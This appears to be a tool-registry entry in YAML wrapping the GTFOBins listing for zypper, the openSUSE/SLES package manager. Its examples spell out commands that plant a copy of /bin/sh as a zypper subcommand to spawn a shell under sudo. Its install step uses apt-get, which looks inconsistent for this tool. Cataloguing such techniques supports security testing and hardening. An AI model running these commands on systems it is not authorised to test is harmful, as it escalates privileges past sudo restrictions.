---
id: package-zypper-zypper
namespace: package:zypper:zypper
name: zypper
description: "openSUSE/SLES package manager; can execute commands and spawn shells."
author: GTFOBins
version: 1.0.0
capabilities:
- security.privilege-escalation.shell
platforms:
- linux
risk_level: medium
trust_level: community
execution_policy: enabled
architectures:
- amd64
- arm64
dependencies: []
related_tools: []
artifacts: []
workflow_edges:
  produces:
  - shell-access
  - command-output
  consumes: []
contract:
  inputs: []
  outputs:
  - type: process.output
    description: Command execution output
  side_effects:
  - process_spawn
  resource_cost:
    cpu: low
    memory_mb: 16
    network: none
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 16
  network: none
  disk_io: low
allowed-tools:
- zypper
parameters: []
features: []
execution:
  template: zypper
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
- description: Spawn an interactive shell (sudo, unprivileged)
  command: 'cp /bin/sh /usr/lib/zypper/commands/zypper-x

    zypper x'
- description: Spawn an interactive shell (sudo, unprivileged)
  command: 'cp /bin/sh /path/to/temp-dir/zypper-x

    PATH=$PATH:/path/to/temp-dir/ zypper x'
references:
- label: GTFOBins
  url: https://gtfobins.github.io/gtfobins/zypper/
techniques:
- privilege-escalation
- execution
install:
- method: apt
  package_name: zypper
  commands:
  - apt-get install -y zypper
---


# zypper

zypper is a command-line utility. openSUSE/SLES package manager; can also spawn an interactive shell.
